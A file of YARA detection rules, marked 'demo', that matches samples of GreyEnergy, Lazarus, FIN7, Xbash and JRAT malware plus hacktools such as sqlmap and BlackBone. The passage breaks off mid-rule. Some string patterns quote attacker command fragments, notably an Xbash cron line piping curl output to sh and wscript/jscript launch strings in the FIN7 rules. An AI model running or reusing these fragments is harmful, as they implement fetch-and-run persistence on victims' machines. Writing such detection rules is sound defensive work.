VULN_JQuery_FileUpload_CVE_2018_9206_Oct18_RID34DE : CVE_2018_9206 DEMO VULN {\n   meta:\n      description = \"Detects JQuery File Upload vulnerability CVE-2018-9206\"\n      author = \"Florian Roth\"\n      reference = \"https://www.zdnet.com/article/zero-day-in-popular-jquery-plugin-actively-exploited-for-at-least-three-years/\"\n      date = \"2018-10-19 15:48:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-11-15\"\n      tags = \"CVE_2018_9206, DEMO, VULN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"error_reporting(E_ALL | E_STRICT);\" fullword ascii\n      $s2 = \"require('UploadHandler.php');\" fullword ascii\n      $s3 = \"$upload_handler = new UploadHandler();\" fullword ascii\n   condition: \n      all of them\n}\n\nrule APT_GreyEnergy_Malware_Oct18_1_RID31FC : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects samples from Grey Energy report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:45:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6c52a5850a57bea43a0a52ff0e2d2179653b97ae5406e884aee63e1cf340f58b\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"%SystemRoot%\\\\System32\\\\thinmon.dll\" fullword ascii\n      $s2 = \"'Cannot delete list entry (fatal error)!9The module %s cannot be executed on this system (0x%.4x).%Enumerate all sessions on TSE\" wide\n      $s8 = \"cbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbecbe\" ascii\n      $s14 = \"configure the service\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and pe.imphash ( ) == \"98d1ad672d0db4b4abdcda73cc9835cb\" and all of them\n}\n\nrule APT_GreyEnergy_Malware_Oct18_2_RID31FD : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects samples from Grey Energy report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:46:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c6a54912f77a39c8f909a66a940350dcd8474c7a1d0e215a878349f1b038c58a\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WioGLtonuaptWmrnttfepgetneemVsnygnV\" fullword ascii\n      $s2 = \"PnSenariopoeKerGEtxrcy\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 2 of them\n}\n\nrule APT_GreyEnergy_Malware_Oct18_3_RID31FE : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects samples from Grey Energy report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:46:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0db5e5b68dc4b8089197de9c1e345056f45c006b7b487f7d8d57b49ae385bad0\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"USQTUNPPQONOPOQUMSNUTRMRRLVPUOPMROPMPMQTPNPONVUOUQOMMNNSRSRQQVTPPRSSNVSTURTMMOPTONSQTOMONQVMQNUSONTQTUTSRRPVTONUQNORQMRRNRUSPS\" fullword ascii\n      $x2 = \"tEMPiuP\" fullword ascii\n      $x3 = \"sryCEMieye\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them\n}\n\nrule APT_GreyEnergy_Malware_Oct18_4_RID31FF : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects samples from Grey Energy report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:46:21\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"6974b8acf6a8f7684673b01753c3a8248a1c491900cccf771db744ca0442f96a\"\n      hash2 = \"165a7853ef51e96ce3f88bb33f928925b24ca5336e49845fc5fc556812092740\"\n      hash3 = \"4470e40f63443aa27187a36bbb0c2f4def42b589b61433630df842b6e365ae3d\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $x1 = \"iiodttd.eWt\" fullword ascii\n      $x2 = \"irnnaar-ite-ornaa-naa-asoeienaeaanlagoeas:acnuihaaa\" fullword ascii\n      $x3 = \"NURVNTURVORSMSPPRTQMPTTQOQRP\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == \"279adfbd42308a07b3131ee57d067b3e\" or 1 of them )\n}\n\nrule APT_GreyEnergy_Malware_Oct18_5_RID3200 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects samples from Grey Energy report\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:46:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"037723bdb9100d19bf15c5c21b649db5f3f61e421e76abe9db86105f1e75847b\"\n      hash2 = \"b602ce32b7647705d68aedbaaf4485f1a68253f8f8132bd5d5f77284a6c2d8bb\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s12 = \"WespySSld.eQ\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and 1 of them\n}\n\nrule SUSP_Size_of_ASUS_TuningTool_RID3197 : DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects an ASUS tuning tool with a suspicious size\"\n      author = \"Florian Roth\"\n      reference = \"https://www.welivesecurity.com/2018/10/17/greyenergy-updated-arsenal-dangerous-threat-actors/\"\n      date = \"2018-10-17 13:29:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-21\"\n      hash1 = \"d4e97a18be820a1a3af639c9bca21c5f85a3f49a37275b37fd012faeffcb7c4a\"\n      tags = \"DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\Release\\\\ASGT.pdb\" ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and filesize > 70KB and all of them\n}\n\nrule MAL_JRAT_Oct18_1_RID2BF9 : DEMO FILE MAL {\n   meta:\n      description = \"Detects JRAT malware\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-10-11 09:29:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ce190c37a6fdb2632f4bc5ea0bb613b3fbe697d04e68e126b41910a6831d3411\"\n      tags = \"DEMO, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"/JRat.class\" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and filesize < 700KB and 1 of them\n}\n\nrule HKTL_SqlMap_RID2AF1 : DEMO HKTL {\n   meta:\n      description = \"Detects sqlmap hacktool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/sqlmapproject/sqlmap\"\n      date = \"2018-10-09 09:33:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"9444478b03caf7af853a64696dd70083bfe67f76aa08a16a151c00aadb540fa8\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"if cmdLineOptions.get(\\\"sqlmapShell\\\"):\" fullword ascii\n      $x2 = \"if conf.get(\\\"dumper\\\"):\" fullword ascii\n   condition: \n      filesize < 50KB and 1 of them\n}\n\nrule HKTL_SqlMap_backdoor_RID2E95 : DEMO FILE HKTL SUSP {\n   meta:\n      description = \"Detects SqlMap backdoors\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/sqlmapproject/sqlmap\"\n      date = \"2018-10-09 11:20:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, HKTL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   condition: \n      ( uint32 ( 0 ) == 0x8e859c07 or uint32 ( 0 ) == 0x2d859c07 or uint32 ( 0 ) == 0x92959c07 or uint32 ( 0 ) == 0x929d9c07 or uint32 ( 0 ) == 0x29959c07 or uint32 ( 0 ) == 0x2b8d9c07 or uint32 ( 0 ) == 0x2b859c07 or uint32 ( 0 ) == 0x28b59c07 ) and filesize < 2KB\n}\n\nrule SUSP_Script_Obfuscation_Char_Concat_RID34A0 : CHINA DEMO OBFUS SCRIPT SUSP {\n   meta:\n      description = \"Detects strings found in sample from CN group repo leak in October 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/JaromirHorejsi/status/1047084277920411648\"\n      date = \"2018-10-04 15:38:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b30cc10e915a23c7273f0838297e0d2c9f4fc0ac1f56100eef6479c9d036c12b\"\n      tags = \"CHINA, DEMO, OBFUS, SCRIPT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\"c\\\" & \\\"r\\\" & \\\"i\\\" & \\\"p\\\" & \\\"t\\\"\" ascii\n   condition: \n      1 of them\n}\n\nrule SUSP_SFX_RunProgram_WScript_RID3143 : DEMO EXE FILE G0047 SUSP {\n   meta:\n      description = \"Detects suspicious SFX as used by Gamaredon group\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-09-27 13:15:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e3bb02c5985fc64759b9c2d3c5474d46237ce472b4a0101c6313dafa939de5a9\"\n      hash2 = \"0ecf88d4b32895b4819dec3acb62eaaa7035aa6292499d903f76af60fcec0d6a\"\n      hash3 = \"a7a48f5220bd1ebe04de258d71fdd001711c165d162bd45e8cfbe8964eddf01c\"\n      tags = \"DEMO, EXE, FILE, G0047, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"RunProgram=\\\"wscript.exe\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and 1 of them\n}\n\nrule SUSP_CMD_Var_Expansion_RID2F2B : DEMO FILE OFFICE SUSP {\n   meta:\n      description = \"Detects Office droppers that include a variable expansion string\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/asfakian/status/1044859525675843585\"\n      date = \"2018-09-26 11:45:41\"\n      score = 45\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, FILE, OFFICE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \" /V:ON\" ascii wide fullword\n   condition: \n      uint16 ( 0 ) == 0xcfd0 and filesize < 500KB and $a1\n}\n\nrule MAL_Xbash_PY_Sep18_RID2D38 : DEMO FILE MAL SCRIPT {\n   meta:\n      description = \"Detects Xbash malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/\"\n      date = \"2018-09-18 10:22:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7a18c7bdf0c504832c8552766dcfe0ba33dd5493daa3d9dbe9c985c1ce36e5aa\"\n      tags = \"DEMO, FILE, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 73 58 62 61 73 68 00 00 00 00 00 00 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x457f and filesize < 10000KB and 1 of them\n}\n\nrule MAL_Xbash_SH_Sep18_RID2D2A : DEMO FILE MAL SCRIPT {\n   meta:\n      description = \"Detects Xbash malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/\"\n      date = \"2018-09-18 10:20:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"a27acc07844bb751ac33f5df569fd949d8b61dba26eb5447482d90243fc739af\"\n      hash2 = \"de63ce4a42f06a5903b9daa62b67fcfbdeca05beb574f966370a6ae7fd21190d\"\n      tags = \"DEMO, FILE, MAL, SCRIPT\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"echo \\\"*/5 * * * * curl -fsSL\" fullword ascii\n      $s2 = \".sh|sh\\\" > /var/spool/cron/root\" ascii\n      $s3 = \"#chmod +x /tmp/hawk\" fullword ascii\n      $s4 = \"if [ ! -f \\\"/tmp/root.sh\\\" ]\" fullword ascii\n      $s5 = \".sh > /tmp/lower.sh\" ascii\n      $s6 = \"chmod 777 /tmp/root.sh\" fullword ascii\n      $s7 = \"-P /tmp && chmod +x /tmp/pools.txt\" fullword ascii\n      $s8 = \"-C /tmp/pools.txt>/dev/null 2>&1\" ascii\n   condition: \n      uint16 ( 0 ) == 0x2123 and filesize < 3KB and 1 of them\n}\n\nrule MAL_Xbash_JS_Sep18_RID2D2C : DEMO MAL {\n   meta:\n      description = \"Detects XBash malware\"\n      author = \"Florian Roth\"\n      reference = \"https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/\"\n      date = \"2018-09-18 10:20:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"f888dda9ca1876eba12ffb55a7a993bd1f5a622a30045a675da4955ede3e4cb8\"\n      tags = \"DEMO, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"var path=WSHShell\" fullword ascii\n      $s2 = \"var myObject= new ActiveXObject(\" ascii\n      $s3 = \"window.resizeTo(0,0)\" fullword ascii\n      $s4 = \"<script language=\\\"JScript\\\">\" fullword ascii\n   condition: \n      filesize < 5KB and 3 of them\n}\n\nrule SUSP_Microsoft_7z_SFX_Combo_RID3120 : ANOMALY DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects a suspicious file that has a Microsoft copyright and is a 7z SFX\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-09-16 13:09:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cce63f209ee4efb4f0419fb4bbb32326392b5ef85cfba80b5b42b861637f1ff1\"\n      tags = \"ANOMALY, DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"7ZSfx%03x.cmd\" fullword wide\n      $s2 = \"7z SFX: error\" fullword ascii\n      $c1 = { 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70\n              00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9\n              00 20 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F\n              00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F\n              00 72 00 61 00 74 00 69 00 6F 00 6E 00 2E 00 20\n              00 41 00 6C 00 6C 00 20 00 72 00 69 00 67 00 68\n              00 74 00 73 00 20 00 72 00 65 00 73 00 65 00 72\n              00 76 00 65 00 64 00 2E } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $s* ) and $c1\n}\n\nrule SUSP_Microsoft_RAR_SFX_Combo_RID3154 : ANOMALY DEMO EXE FILE SUSP {\n   meta:\n      description = \"Detects a suspicious file that has a Microsoft copyright and is a RAR SFX\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-09-16 13:17:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"ANOMALY, DEMO, EXE, FILE, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"winrarsfxmappingfile.tmp\" fullword wide\n      $s2 = \"WinRAR self-extracting archive\" fullword wide\n      $s3 = \"WINRAR.SFX\" fullword\n      $c1 = { 00 4C 00 65 00 67 00 61 00 6C 00 43 00 6F 00 70\n              00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 A9\n              00 20 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F\n              00 66 00 74 00 20 00 43 00 6F 00 72 00 70 00 6F\n              00 72 00 61 00 74 00 69 00 6F 00 6E 00 2E 00 20\n              00 41 00 6C 00 6C 00 20 00 72 00 69 00 67 00 68\n              00 74 00 73 00 20 00 72 00 65 00 73 00 65 00 72\n              00 76 00 65 00 64 00 2E } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $s* ) and $c1\n}\n\nrule HTKL_BlackBone_DriverInjector_RID320D : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects BlackBone Driver injector\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/DarthTon/Blackbone\"\n      date = \"2018-09-11 13:48:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8062a4284c719412270614458150cb4abbdf77b2fc35f770ce9c45d10ccb1f4d\"\n      hash2 = \"2d2fc27200c22442ac03e2f454b6e1f90f2bbc17017f05b09f7824fac6beb14b\"\n      hash3 = \"e45da157483232d9c9c72f44b13fca2a0d268393044db00104cc1afe184ca8d1\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"=INITtH=PAGEtA\" fullword ascii\n      $s2 = \"BBInjectDll\" fullword ascii\n      $s3 = \"LdrLoadDll\" fullword ascii\n      $s4 = \"\\\\??\\\\pipe\\\\%ls\" fullword wide\n      $s5 = \"Failed to retrieve Kernel base address. Aborting\" fullword ascii\n      $x2 = \"BlackBone: %s: APC injection failed with status 0x%X\" fullword ascii\n      $x3 = \"BlackBone: PDE_BASE/PTE_BASE not found \" fullword ascii\n      $x4 = \"%s: Invalid injection type specified - %d\" fullword ascii\n      $x6 = \"Trying to map C:\\\\windows\\\\system32\\\\cmd.exe into current process\" fullword wide\n      $x7 = \"\\\\BlackBoneDrv\\\\bin\\\\\" ascii\n      $x8 = \"DosDevices\\\\BlackBone\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and ( 3 of them or 1 of ( $x* ) )\n}\n\nrule APT_Lazarus_Aug18_Downloader_1_RID321A : APT DEMO EXE FILE G0032 NK {\n   meta:\n      description = \"Detects Lazarus Group Malware Downloadery\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/operation-applejeus/87553/\"\n      date = \"2018-08-24 13:50:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"d555dcb6da4a6b87e256ef75c0150780b8a343c4a1e09935b0647f01d974d94d\"\n      hash2 = \"bdff852398f174e9eef1db1c2d3fefdda25fe0ea90a40a2e06e51b5c0ebd69eb\"\n      hash3 = \"e2199fc4e4b31f7e4c61f6d9038577633ed6ad787718ed7c39b36f316f38befd\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"H:\\\\DEV\\\\TManager\\\\\" ascii\n      $x2 = \"\\\\Release\\\\dloader.pdb\" ascii\n      $x3 = \"Z:\\\\jeus\\\\\" \n      $x4 = \"\\\\Debug\\\\dloader.pdb\" ascii\n      $x5 = \"Moz&Wie;#t/6T!2yW29ab@ad%Df324V$Yd\" fullword ascii\n      $s1 = \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)\" fullword ascii\n      $s2 = \"Error protecting memory page\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( ( 1 of ( $x* ) or 2 of them ) )\n}\n\nrule APT_Lazarus_Aug18_1_RID2DAC : APT DEMO EXE FILE G0032 NK {\n   meta:\n      description = \"Detects Lazarus Group Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/operation-applejeus/87553/\"\n      date = \"2018-08-24 10:41:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ef400d73c6920ac811af401259e376458b498eb0084631386136747dfc3dcfa8\"\n      hash2 = \"1b8d3e69fc214cb7a08bef3c00124717f4b4d7fd6be65f2829e9fd337fc7c03c\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, NK\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"mws2_32.dll\" fullword wide\n      $s2 = \"%s.bat\" fullword wide\n      $s3 = \"%s%s%s \\\"%s > %s 2>&1\\\"\" fullword wide\n      $s4 = \"Microsoft Corporation. All rights reserved.\" fullword wide\n      $s5 = \"ping 127.0.0.1 -n 3\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( pe.imphash ( ) == \"3af996e4f960108533e69b9033503f40\" or 4 of them )\n}\n\nrule APT_Lazarus_Aug18_2_RID2DAD : APT DEMO EXE FILE G0032 NK {\n   meta:\n      description = \"Detects Lazarus Group Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/operation-applejeus/87553/\"\n      date = \"2018-08-24 10:42:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"8ae766795cda6336fd5cad9e89199ea2a1939a35e03eb0e54c503b1029d870c4\"\n      hash2 = \"d3ef262bae0beb5d35841d131b3f89a9b71a941a86dab1913bda72b935744d2e\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"vAdvapi32.dll\" fullword wide\n      $s2 = \"lws2_32.dll\" fullword wide\n      $s3 = \"%s %s > \\\"%s\\\" 2>&1\" fullword wide\n      $s4 = \"Not Service\" fullword wide\n      $s5 = \"ping 127.0.0.1 -n 3\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 4 of them )\n}\n\nrule EXP_DriveCrypt_1_RID2CF9 : DEMO EXE EXPLOIT FILE {\n   meta:\n      description = \"Detects DriveCrypt exploit\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-08-21 10:12:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0dd09bc97c768abb84d0fb6d1ae7d789f1f83bfb2ce93ff9ff3c538dc1effa33\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"x64passldr.exe\" fullword ascii\n      $s2 = \"DCR.sys\" fullword ascii\n      $s3 = \"amd64\\\\x64pass.sys\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 700KB and 2 of them\n}\n\nrule EXP_DriveCrypt_x64passldr_RID30A3 : DEMO EXE EXPLOIT FILE {\n   meta:\n      description = \"Detects DriveCrypt exploit\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2018-08-21 12:48:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"c828304c83619e2cb9dab80305e5286aba91742dc550e1469d91812af27101a1\"\n      tags = \"DEMO, EXE, EXPLOIT, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"\\\\x64\\\\x64passldr.pdb\" ascii\n      $s2 = \"\\\\amd64\\\\x64pass.sys\" wide\n      $s3 = \"\\\\\\\\.\\\\DCR\" fullword ascii\n      $s4 = \"Open SC Mgr Error\" fullword ascii\n      $s5 = \"thing is ok \" fullword ascii\n      $s6 = \"x64pass\" fullword wide\n      $s7 = \"%ws\\\\%ws\\\\Security\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them\n}\n\nrule MAL_Metasploit_Framework_UA_RID316E : DEMO EXE FILE MAL METASPLOIT SUSP {\n   meta:\n      description = \"Detects User Agent used in Metasploit Framework\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/rapid7/metasploit-framework/commit/12a6d67be48527f5d3987e40cac2a0cbb4ab6ce7\"\n      date = \"2018-08-16 13:22:11\"\n      score = 65\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"1743e1bd4176ffb62a1a0503a0d76033752f8bd34f6f09db85c2979c04bbdd29\"\n      tags = \"DEMO, EXE, FILE, MAL, METASPLOIT, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 1 of them\n}\n\nrule APT_HiddenCobra_GhostSecret_1_RID31E2 : APT DEMO EXE FILE G0032 NK {\n   meta:\n      description = \"Detects Hidden Cobra Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/\"\n      date = \"2018-08-11 13:41:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"05a567fe3f7c22a0ef78cc39dcf2d9ff283580c82bdbe880af9549e7014becfc\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s\\\\%s.dll\" fullword wide\n      $s2 = \"PROXY_SVC_DLL.dll\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule APT_HiddenCobra_GhostSecret_2_RID31E3 : APT DEMO EXE FILE G0032 NK {\n   meta:\n      description = \"Detects Hidden Cobra Sample\"\n      author = \"Florian Roth\"\n      reference = \"https://securingtomorrow.mcafee.com/mcafee-labs/analyzing-operation-ghostsecret-attack-seeks-to-steal-data-worldwide/\"\n      date = \"2018-08-11 13:41:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"45e68dce0f75353c448865b9abafbef5d4ed6492cd7058f65bf6aac182a9176a\"\n      tags = \"APT, DEMO, EXE, FILE, G0032, NK\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ping 127.0.0.1 -n 3\" fullword wide\n      $s2 = \"Process32\" fullword ascii\n      $s11 = \"%2d%2d%2d%2d%2d%2d\" fullword ascii\n      $s12 = \"del /a \\\"\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule APT_FIN7_Strings_Aug18_1_RID2F27 : APT DEMO G0046 RUSSIA {\n   meta:\n      description = \"Detects strings from FIN7 report in August 2018\"\n      author = \"Florian Roth\"\n      reference = \"https://www.fireeye.com/blog/threat-research/2018/08/fin7-pursuing-an-enigmatic-and-evasive-global-criminal-operation.html\"\n      date = \"2018-08-01 11:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"b6354e46af0d69b6998dbed2fceae60a3b207584e08179748e65511d45849b00\"\n      tags = \"APT, DEMO, G0046, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"&&call %a01%%a02% /e:jscript\" ascii\n      $s2 = \"wscript.exe //b /e:jscript %TEMP%\" ascii\n      $s3 = \" w=wsc@ript /b \" ascii\n      $s4 = \"@echo %w:@=%|cmd\" ascii\n      $s5 = \" & wscript //b /e:jscript\" \n   condition: \n      1 of them\n}\n\nrule APT_FIN7_Sample_Aug18_2_RID2EA0 : APT DEMO FILE G0046 RUSSIA {\n   meta:\n      description = \"Detects FIN7 malware sample\"\n      author = \"Florian Roth\"\n      reference = 